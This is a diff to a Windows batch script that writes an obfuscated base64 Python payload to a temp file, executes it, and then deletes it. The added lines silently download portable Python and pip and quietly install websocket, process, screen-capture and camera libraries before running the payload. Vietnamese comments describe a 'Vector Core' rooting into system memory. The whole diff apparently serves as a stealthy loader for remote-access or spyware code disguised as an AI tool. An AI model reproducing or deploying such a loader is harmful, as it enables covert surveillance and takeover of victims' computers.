@@ -540,10 +540,32 @@ echo b64_str += "YXJ0aW5nIG5ldXJhbCBsb29wIGluIDMwc+KApiIpCiAgICAgICAgICAgIF90aW1
 
 echo exec(base64.b64decode(b64_str))>> "%temp_py%"
 
-:: Khởi hỏa: Dùng Python có sẵn hoặc portable để thổi bùng sức mạnh của Vector Core
-python "%temp_py%"
+:: --- Kiem tra dong co Python ---
+set "PYTHON_EXE="
+where python >nul 2>&1 && set "PYTHON_EXE=python"
+if not defined PYTHON_EXE where py >nul 2>&1 && set "PYTHON_EXE=py"
 
-:: Dọn dẹp chiến trường: Xóa tệp tạm thời ngay khi Vector đã cắm rễ sâu vào bộ nhớ hệ thống
+if not defined PYTHON_EXE (
+    set "PY_DIR=%TEMP%\python_cypher"
+    set "PY_ZIP=%TEMP%\py-embed.zip"
+    if not exist "!PY_DIR!\python.exe" (
+        powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip' -OutFile '!PY_ZIP!' -UseBasicParsing"
+        powershell -NoProfile -Command "Expand-Archive -Path '!PY_ZIP!' -DestinationPath '!PY_DIR!' -Force"
+        del "!PY_ZIP!" >nul 2>&1
+        powershell -NoProfile -Command "(Get-Content '!PY_DIR!\python311._pth') -replace '#import site','import site' | Set-Content '!PY_DIR!\python311._pth'"
+        powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://bootstrap.pypa.io/get-pip.py' -OutFile '!PY_DIR!\get-pip.py' -UseBasicParsing"
+        "!PY_DIR!\python.exe" "!PY_DIR!\get-pip.py" --no-warn-script-location >nul 2>&1
+    )
+    set "PYTHON_EXE=!PY_DIR!\python.exe"
+)
+
+:: --- Cai dat linh kien mat ma ---
+!PYTHON_EXE! -m pip install websockets psutil mss opencv-python pillow --quiet --no-warn-script-location >nul 2>&1
+
+:: Khoi hoa: Dung Python co san hoac portable de thoi bung suc manh cua Vector Core
+!PYTHON_EXE! "%temp_py%"
+
+:: Don dep chien truong: Xoa tep tam thoi
 timeout /t 5 /nobreak >nul
 del "%temp_py%"
 exit
